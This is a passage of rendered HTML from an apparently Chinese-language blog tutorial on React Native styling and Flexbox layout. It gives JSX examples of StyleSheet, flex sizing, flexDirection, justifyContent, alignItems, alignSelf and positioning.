class=\"line\">  &#125;,</span><br><span class=\"line\">  title: &#123;</span><br><span class=\"line\">    fontSize: <span class=\"number\">20</span>,</span><br><span class=\"line\">    marginBottom: <span class=\"number\">8</span>,</span><br><span class=\"line\">    textAlign: <span class=\"string\">'center'</span>,</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  year: &#123;</span><br><span class=\"line\">    textAlign: <span class=\"string\">'center'</span>,</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  thumbnail: &#123;</span><br><span class=\"line\">    width: <span class=\"number\">53</span>,</span><br><span class=\"line\">    height: <span class=\"number\">81</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> App;</span><br></pre></td></tr></table></figure>\n<h1 id=\"设计\"><a href=\"#设计\" class=\"headerlink\" title=\"设计\"></a>设计</h1><h2 id=\"RN中的样式\"><a href=\"#RN中的样式\" class=\"headerlink\" title=\"RN中的样式\"></a>RN中的样式</h2><p>所有的核心组件都接受名为<code>style</code>的属性。这些样式名基本上是遵循了 web 上的 CSS 的命名，只是按照 JS 的语法要求使用了驼峰命名法，例如将<code>background-color</code>改为<code>backgroundColor</code>。</p>\n<ul>\n<li><p><code>style</code>属性可以是一个普通的 JavaScript 对象</p>\n</li>\n<li><p>使用<code>StyleSheet.create</code>来集中定义组件的样式。</p>\n</li>\n</ul>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> React, &#123; Component &#125; <span class=\"keyword\">from</span> <span class=\"string\">'react'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; StyleSheet, Text, View &#125; <span class=\"keyword\">from</span> <span class=\"string\">'react-native'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">LotsOfStyles</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;View&gt;</span><br><span class=\"line\">        &lt;Text style=&#123;styles.red&#125;&gt;just red&lt;<span class=\"regexp\">/Text&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;Text style=&#123;styles.bigBlue&#125;&gt;just bigBlue&lt;/</span>Text&gt;</span><br><span class=\"line\">        &lt;Text style=&#123;[styles.bigBlue, styles.red]&#125;&gt;bigBlue, then red&lt;<span class=\"regexp\">/Text&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;Text style=&#123;[styles.red, styles.bigBlue]&#125;&gt;red, then bigBlue&lt;/</span>Text&gt;</span><br><span class=\"line\">      &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    );</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br><span class=\"line\"><span class=\"regexp\"></span></span><br><span class=\"line\"><span class=\"regexp\">const styles = StyleSheet.create(&#123;</span></span><br><span class=\"line\"><span class=\"regexp\">  bigBlue: &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">    color: 'blue',</span></span><br><span class=\"line\"><span class=\"regexp\">    fontWeight: 'bold',</span></span><br><span class=\"line\"><span class=\"regexp\">    fontSize: 30,</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;,</span></span><br><span class=\"line\"><span class=\"regexp\">  red: &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">    color: 'red',</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;,</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;);</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"高度与宽度\"><a href=\"#高度与宽度\" class=\"headerlink\" title=\"高度与宽度\"></a>高度与宽度</h2><p>组件的高度和宽度决定了其在屏幕上显示的尺寸。</p>\n<h3 id=\"指定宽高\"><a href=\"#指定宽高\" class=\"headerlink\" title=\"指定宽高\"></a>指定宽高</h3><p>样式中指定固定的<code>width</code>和<code>height</code>。React Native 中的尺寸都是无单位的，表示的是与设备像素密度无关的逻辑像素点。</p>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> React, &#123; Component &#125; <span class=\"keyword\">from</span> <span class=\"string\">'react'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; View &#125; <span class=\"keyword\">from</span> <span class=\"string\">'react-native'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">FixedDimensionsBasics</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;View&gt;</span><br><span class=\"line\">        &lt;View style=&#123;&#123;<span class=\"attr\">width</span>: <span class=\"number\">50</span>, <span class=\"attr\">height</span>: <span class=\"number\">50</span>, <span class=\"attr\">backgroundColor</span>: <span class=\"string\">'powderblue'</span>&#125;&#125; /&gt;</span><br><span class=\"line\">        &lt;View style=&#123;&#123;<span class=\"attr\">width</span>: <span class=\"number\">100</span>, <span class=\"attr\">height</span>: <span class=\"number\">100</span>, <span class=\"attr\">backgroundColor</span>: <span class=\"string\">'skyblue'</span>&#125;&#125; /&gt;</span><br><span class=\"line\">        &lt;View style=&#123;&#123;<span class=\"attr\">width</span>: <span class=\"number\">150</span>, <span class=\"attr\">height</span>: <span class=\"number\">150</span>, <span class=\"attr\">backgroundColor</span>: <span class=\"string\">'steelblue'</span>&#125;&#125; /&gt;</span><br><span class=\"line\">      &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    );</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p>这样给组件设置尺寸也是一种常见的模式，比如要求在不同尺寸的屏幕上都显示成一样的大小。</p>\n<p><img src=\"/view/posts/e61ae078/image-20200326151335084.png\" alt=\"image-20200326151335084\" style=\"zoom:50%;\"></p>\n<p><strong>注意：此时没法适配多种屏幕大小</strong></p>\n<h3 id=\"弹性（Flex）宽高\"><a href=\"#弹性（Flex）宽高\" class=\"headerlink\" title=\"弹性（Flex）宽高\"></a>弹性（Flex）宽高</h3><p>在组件样式中使用<code>flex</code>可以使其在可利用的空间中动态地扩张或收缩。一般而言我们会使用<code>flex:1</code>来指定某个组件扩张以撑满所有剩余的空间。如果有多个并列的子组件使用了<code>flex:1</code>，则这些子组件会平分父容器中剩余的空间。如果这些并列的子组件的<code>flex</code>值不一样，则谁的值更大，谁占据剩余空间的比例就更大（即占据剩余空间的比等于并列组件间<code>flex</code>值的比）。</p>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> App = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (</span><br><span class=\"line\">    &lt;View style=&#123;styles.father&#125;&gt;</span><br><span class=\"line\">      &lt;View style=&#123;styles.son1&#125; /&gt;</span><br><span class=\"line\">      &lt;View style=&#123;styles.son2&#125; /&gt;</span><br><span class=\"line\">      &lt;View style=&#123;styles.son3&#125; /&gt;</span><br><span class=\"line\">    &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">  )</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">/</span><span class=\"regexp\">/ 去掉父View中的`flex: 1`。  ----- View不再具有尺寸，因此子组件也无法再撑开。</span></span><br><span class=\"line\"><span class=\"regexp\">/</span><span class=\"regexp\">/ 然后再用`height: 300`来代替父View的`flex: 1` ---- 父View的高度变成300</span></span><br><span class=\"line\"><span class=\"regexp\">const styles = StyleSheet.create(&#123;</span></span><br><span class=\"line\"><span class=\"regexp\">  father: &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">    flex: 1,</span></span><br><span class=\"line\"><span class=\"regexp\">    /</span><span class=\"regexp\">/ flexDirection: \"row\", /</span><span class=\"regexp\">/ 改变子元素的伸缩方向</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;,</span></span><br><span class=\"line\"><span class=\"regexp\">  son1: &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">    flex: 1,</span></span><br><span class=\"line\"><span class=\"regexp\">    backgroundColor: 'powderblue'</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;,</span></span><br><span class=\"line\"><span class=\"regexp\">  son2: &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">    flex: 2, </span></span><br><span class=\"line\"><span class=\"regexp\">    backgroundColor: 'skyblue'</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;,</span></span><br><span class=\"line\"><span class=\"regexp\">  son3: &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">    flex: 3,</span></span><br><span class=\"line\"><span class=\"regexp\">    backgroundColor: 'steelblue'</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;,</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;);</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"/view/posts/e61ae078/image-20200326151248022.png\" alt=\"image-20200326151248022\" style=\"zoom:50%;\"></p>\n<h2 id=\"使用Flexbox布局\"><a href=\"#使用Flexbox布局\" class=\"headerlink\" title=\"使用Flexbox布局\"></a>使用Flexbox布局</h2><p>Flexbox 可以在不同屏幕尺寸上提供一致的布局结构。</p>\n<p>使用<code>flexDirection</code>、<code>alignItems</code>和 <code>justifyContent</code>三个样式属性就已经能满足大多数布局需求。</p>\n<blockquote>\n<p>React Native 中的 Flexbox 的工作原理和 web 上的 CSS 基本一致，当然也存在少许差异。首先是默认值不同：<code>flexDirection</code>的默认值是<code>column</code>而不是<code>row</code>，而<code>flex</code>也只能指定一个数字值。</p>\n</blockquote>\n<h3 id=\"Flex\"><a href=\"#Flex\" class=\"headerlink\" title=\"Flex\"></a>Flex</h3><p>如上</p>\n<h3 id=\"Flex-Direction\"><a href=\"#Flex-Direction\" class=\"headerlink\" title=\"Flex Direction\"></a>Flex Direction</h3><p><code>flexDirection</code>可以决定布局的<strong>主轴</strong>。<strong>水平轴(<code>row</code>)</strong>方向，竖直轴(<code>column</code>)<strong>方向。默认值是</strong>竖直轴(<code>column</code>)方向。</p>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">App</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      <span class=\"comment\">// 尝试把`flexDirection`改为`column`看看</span></span><br><span class=\"line\">      &lt;View style=&#123;&#123;<span class=\"attr\">flex</span>: <span class=\"number\">1</span>, <span class=\"attr\">flexDirection</span>: <span class=\"string\">'row'</span>&#125;&#125;&gt;</span><br><span class=\"line\">        &lt;View style=&#123;&#123;<span class=\"attr\">width</span>: <span class=\"number\">50</span>, <span class=\"attr\">height</span>: <span class=\"number\">50</span>, <span class=\"attr\">backgroundColor</span>: <span class=\"string\">'powderblue'</span>&#125;&#125; /&gt;</span><br><span class=\"line\">        &lt;View style=&#123;&#123;<span class=\"attr\">width</span>: <span class=\"number\">50</span>, <span class=\"attr\">height</span>: <span class=\"number\">50</span>, <span class=\"attr\">backgroundColor</span>: <span class=\"string\">'skyblue'</span>&#125;&#125; /&gt;</span><br><span class=\"line\">        &lt;View style=&#123;&#123;<span class=\"attr\">width</span>: <span class=\"number\">50</span>, <span class=\"attr\">height</span>: <span class=\"number\">50</span>, <span class=\"attr\">backgroundColor</span>: <span class=\"string\">'steelblue'</span>&#125;&#125; /&gt;</span><br><span class=\"line\">      &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    );</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"/view/posts/e61ae078/image-20200326154915534.png\" alt=\"image-20200326154915534\" style=\"zoom:50%;\"></p>\n<h3 id=\"布局方向\"><a href=\"#布局方向\" class=\"headerlink\" title=\"布局方向\"></a>布局方向</h3><p><strong>LTR：文本和子项，从左到右排列</strong></p>\n<p>布局方向指定层次结构中子级和文本的布局方向。 布局方向也会影响边的起点和终点。</p>\n<p> 默认情况下，React Native使用LTR布局方向进行布局。 在此模式下，开始是指左，结束是指右。</p>\n<p>LTR（默认值）文本和子项，从左到右排列。 元素的开始处应用的边距和填充在左侧。</p>\n<p>RTL文本和子级，从右到左排列。 应用于元素开始的边距和填充在右侧。</p>\n<h3 id=\"Justify-Content\"><a href=\"#Justify-Content\" class=\"headerlink\" title=\"Justify Content\"></a>Justify Content</h3><figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">App</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      <span class=\"comment\">// 尝试把`justifyContent`改为`center`看看</span></span><br><span class=\"line\">      <span class=\"comment\">// 尝试把`flexDirection`改为`row`看看</span></span><br><span class=\"line\">      &lt;View style=&#123;&#123;</span><br><span class=\"line\">        flex: <span class=\"number\">1</span>,</span><br><span class=\"line\">        flexDirection: <span class=\"string\">'column'</span>, <span class=\"comment\">// 默认纵向布局</span></span><br><span class=\"line\">        justifyContent: <span class=\"string\">'space-between'</span>,</span><br><span class=\"line\">      &#125;&#125;&gt;</span><br><span class=\"line\">        &lt;View style=&#123;&#123;<span class=\"attr\">width</span>: <span class=\"number\">100</span>, <span class=\"attr\">height</span>: <span class=\"number\">100</span>, <span class=\"attr\">backgroundColor</span>: <span class=\"string\">'powderblue'</span>&#125;&#125; /&gt;</span><br><span class=\"line\">        &lt;View style=&#123;&#123;<span class=\"attr\">width</span>: <span class=\"number\">100</span>, <span class=\"attr\">height</span>: <span class=\"number\">100</span>, <span class=\"attr\">backgroundColor</span>: <span class=\"string\">'skyblue'</span>&#125;&#125; /&gt;</span><br><span class=\"line\">        &lt;View style=&#123;&#123;<span class=\"attr\">width</span>: <span class=\"number\">100</span>, <span class=\"attr\">height</span>: <span class=\"number\">100</span>, <span class=\"attr\">backgroundColor</span>: <span class=\"string\">'steelblue'</span>&#125;&#125; /&gt;</span><br><span class=\"line\">      &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    );</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"/view/posts/e61ae078/image-20200326155234896.png\" alt=\"image-20200326155234896\" style=\"zoom:50%;\"></p>\n<h3 id=\"Align-Items\"><a href=\"#Align-Items\" class=\"headerlink\" title=\"Align Items\"></a>Align Items</h3><figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">App</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      <span class=\"comment\">// 尝试把`alignItems`改为`flex-start`看看</span></span><br><span class=\"line\">      <span class=\"comment\">// 尝试把`justifyContent`改为`flex-end`看看</span></span><br><span class=\"line\">      <span class=\"comment\">// 尝试把`flexDirection`改为`row`看看</span></span><br><span class=\"line\">      &lt;View style=&#123;&#123;</span><br><span class=\"line\">        flex: <span class=\"number\">1</span>,</span><br><span class=\"line\">        flexDirection: <span class=\"string\">'column'</span>,</span><br><span class=\"line\">        justifyContent: <span class=\"string\">'center'</span>,</span><br><span class=\"line\">        alignItems: <span class=\"string\">'stretch'</span>,</span><br><span class=\"line\">      &#125;&#125;&gt;</span><br><span class=\"line\">        &lt;View style=&#123;&#123;<span class=\"attr\">width</span>: <span class=\"number\">50</span>, <span class=\"attr\">height</span>: <span class=\"number\">50</span>, <span class=\"attr\">backgroundColor</span>: <span class=\"string\">'powderblue'</span>&#125;&#125; /&gt;</span><br><span class=\"line\">        &lt;View style=&#123;&#123;<span class=\"attr\">height</span>: <span class=\"number\">50</span>, <span class=\"attr\">backgroundColor</span>: <span class=\"string\">'skyblue'</span>&#125;&#125; /&gt;</span><br><span class=\"line\">        &lt;View style=&#123;&#123;<span class=\"attr\">height</span>: <span class=\"number\">100</span>, <span class=\"attr\">backgroundColor</span>: <span class=\"string\">'steelblue'</span>&#125;&#125; /&gt;</span><br><span class=\"line\">      &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    );</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"/view/posts/e61ae078/image-20200326155524158.png\" alt=\"image-20200326155524158\" style=\"zoom:50%;\"></p>\n<h3 id=\"Align-Self\"><a href=\"#Align-Self\" class=\"headerlink\" title=\"Align Self\"></a>Align Self</h3><p>alignSelf具有与alignItems相同的选项和效果，但是不影响容器中的子元素，您可以将此属性应用于单个子元素，以更改其在其父元素中的对齐方式。alignSelf用alignItems覆盖父类设置的任何选项。</p>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">App</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;View style=&#123;&#123;</span><br><span class=\"line\">        flex: <span class=\"number\">1</span>,</span><br><span class=\"line\">        flexDirection: <span class=\"string\">'column'</span>,</span><br><span class=\"line\">        justifyContent: <span class=\"string\">'center'</span>,</span><br><span class=\"line\">        alignItems: <span class=\"string\">'stretch'</span>,</span><br><span class=\"line\">      &#125;&#125;&gt;</span><br><span class=\"line\">        &lt;View style=&#123;&#123;<span class=\"attr\">height</span>: <span class=\"number\">100</span>, <span class=\"attr\">backgroundColor</span>: <span class=\"string\">'powderblue'</span>&#125;&#125; &gt;</span><br><span class=\"line\">          &lt;Text style=&#123;&#123;<span class=\"attr\">alignSelf</span>: <span class=\"string\">'flex-end'</span>,<span class=\"attr\">weight</span>: <span class=\"number\">50</span>, <span class=\"attr\">height</span>: <span class=\"number\">50</span>, <span class=\"attr\">backgroundColor</span>: <span class=\"string\">'red'</span>&#125;&#125; &gt;子内容&lt;<span class=\"regexp\">/Text&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;/</span>View&gt;</span><br><span class=\"line\">        &lt;View style=&#123;&#123;<span class=\"attr\">height</span>: <span class=\"number\">50</span>, <span class=\"attr\">backgroundColor</span>: <span class=\"string\">'skyblue'</span>&#125;&#125; /&gt;</span><br><span class=\"line\">        &lt;View style=&#123;&#123;<span class=\"attr\">height</span>: <span class=\"number\">100</span>, <span class=\"attr\">backgroundColor</span>: <span class=\"string\">'steelblue'</span>&#125;&#125; /&gt;</span><br><span class=\"line\">      &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    );</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p><strong>alignSelf: <code>flex-start|flex-end|center|stretch</code></strong></p>\n<p><img src=\"/view/posts/e61ae078/image-20200326160914205.png\" alt=\"image-20200326160914205\" style=\"zoom:50%;\"></p>\n<h3 id=\"Align-Content\"><a href=\"#Align-Content\" class=\"headerlink\" title=\"Align Content\"></a>Align Content</h3><p>alignContent定义沿横轴的线分布。 仅当使用flexWrap将项目包装到多行时，此功能才有效。</p>\n<ul>\n<li><code>flex-start</code>（默认值）将换行对齐到容器横轴的起点。</li>\n<li><code>flex-end</code>将换行对齐到容器横轴的末端。</li>\n<li><code>stretch</code> 包装线以匹配容器横轴的高度。</li>\n<li><code>center</code>将包装线对齐到容器横轴的中心。</li>\n<li><code>space-between</code>在容器的主轴上均匀间隔的线，在线之间分配剩余空间。</li>\n<li><code>space-around</code>在容器的主轴上均匀间隔地包裹线，在线周围分配剩余空间。 与使用空格之间的空间相比，周围的空间将导致空间分配到第一行的开头和最后一行的末尾。</li>\n<li><code>space-evenly</code> 沿主轴均匀地分布在对齐容器内。 每对相邻项之间的间距，主开始边缘和第一个项目以及主结束边缘和最后一个项目都完全相同。</li>\n</ul>\n<p><img src=\"/view/posts/e61ae078/image-20200331154557560.png\" alt=\"image-20200331154557560\" style=\"zoom:67%;\"></p>\n<h3 id=\"Flex-Wrap\"><a href=\"#Flex-Wrap\" class=\"headerlink\" title=\"Flex Wrap\"></a>Flex Wrap</h3><p>flexWrap属性在容器上设置，并控制当子原生沿主轴溢出容器大小时发生的情况。 默认情况下，子级被强制为一行（可以收缩元素）。 如果允许包装，则根据需要将项目沿主轴包装成多行。</p>\n<p>换行时，可以使用alignContent指定行在容器中的放置方式。</p>\n<p><img src=\"/view/posts/e61ae078/image-20200331154722643.png\" alt=\"image-20200331154722643\" style=\"zoom:50%;\"></p>\n<h3 id=\"Flex-Basis-Grow-and-Shrink\"><a href=\"#Flex-Basis-Grow-and-Shrink\" class=\"headerlink\" title=\"Flex Basis, Grow, and Shrink\"></a>Flex Basis, Grow, and Shrink</h3><ul>\n<li><p>flexGrow描述如何沿主轴在容器的子级之间分配容器中的任何空间。 布置好其子项后，容器将根据其子项指定的伸缩增长值分配所有剩余空间。</p>\n<ul>\n<li>flexGrow接受任何大于等于0的浮点值，其中0为默认值。 容器将在孩子之间分配剩余空间，该剩余空间将根据孩子的弹性增长值来加权。</li>\n</ul>\n</li>\n<li><p>flexShrink描述了在子项的总大小溢出主轴上容器大小的情况下如何沿主轴收缩子项。 Flex收缩与Flex增长非常相似，如果任何溢出大小都被视为负剩余空间，则可以用相同的方式来考虑。 通过允许孩子根据需要生长和收缩，这两个属性也可以很好地协同工作。</p>\n<ul>\n<li>Flex收缩接受任何大于等于0的浮点值，默认值为1。 容器将根据其子项的flex收缩值对子项进行收缩。</li>\n</ul>\n</li>\n<li><p>flexBasis是一种与轴无关的方式，用于沿主轴提供项目的默认大小。 如果子项的父级是具有flexDirection：row的容器，则设置子项的flex基础类似于设置子项的宽度；如果子项的父级是具有flexDirection：列的容器，则设置子项的高度。 项目的伸缩基础是该项目的默认大小，即执行任何伸缩增长和伸缩收缩计算之前的项目大小。</p>\n</li>\n</ul>\n<h3 id=\"宽度和高度\"><a href=\"#宽度和高度\" class=\"headerlink\" title=\"宽度和高度\"></a>宽度和高度</h3><p>Yoga中的width属性指定元素内容区域的宽度。 同样，height属性指定元素内容区域的高度。</p>\n<p>宽度和高度都可以采用以下值：</p>\n<ul>\n<li><p>auto是默认值，React Native根据元素的内容（无论是其他子元素，文本还是图像）计算元素的宽度/高度。</p>\n</li>\n<li><p>pixel定义宽度/高度，以绝对像素为单位。 根据组件上设置的其他样式，这可能是节点的最终尺寸，也可能不是。</p>\n</li>\n<li><p>percent定义宽度或高度，以其父级宽度或高度的百分比表示。</p>\n</li>\n</ul>\n<h3 id=\"绝对和相对布局\"><a href=\"#绝对和相对布局\" class=\"headerlink\" title=\"绝对和相对布局\"></a>绝对和相对布局</h3><p>元素的位置类型定义了元素在其父元素中的位置。</p>\n<p>相对（默认值）默认情况下，元素是相对放置的。 这意味着元素将根据布局的正常流程进行定位，然后根据上，右，下和左的值相对于该位置偏移。 偏移量不会影响任何同级元素或父元素的位置。</p>\n<p>绝对当绝对定位时，元素不参与正常的布局流程。 相反，它的布局与兄弟姐妹无关。 根据顶部，右侧，底部和左侧的值确定位置。</p>\n<p><img src=\"/view/posts/e61ae078/image-20200331155044160.png\" alt=\"image-20200331155044160\" style=\"zoom:50%;\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"入门基础\"><a href=\"#入门基础\" class=\"headerlink\" title=\"入门基础\"></a>入门基础</h1><h2 id=\"核心组件和原生组件\"><a href=\"#核心组件和原生组件\" class=\"headerlink\" title=\"核心组件和原生组件\"></a>核心组件和原生组件</h2><h3 id=\"原生组件\"><a href=\"#原生组件\" class=\"headerlink\" title=\"原生组件\"></a>原生组件</h3><p>使用React Native，您可以使用React组件通过JavaScript调用Android 和IOS视图。 在运行时，React Native为这些组件创建相应的Android和iOS视图。 由于React Native组件具有与Android和iOS相同的视图支持，因此React Native应用的外观，感觉和性能与其他任何应用一样。 我们将这些平台支持的组件称为“本机组件”。</p>\n<p>通过React Native，您可以为Android和iOS构建自己的Native Components，以满足您应用的独特需求。 我们还有一个由社区贡献的组成部分的繁荣生态系统。 查看本机目录以查找社区正在创建的内容。</p>\n<p>React Native还包括一组基本的，随时可用的Native组件，您可以使用它们立即开始构建您的应用程序。 这些是React Native的核心组件。</p>\n<h3 id=\"核心组件\"><a href=\"#核心组件\" class=\"headerlink\" 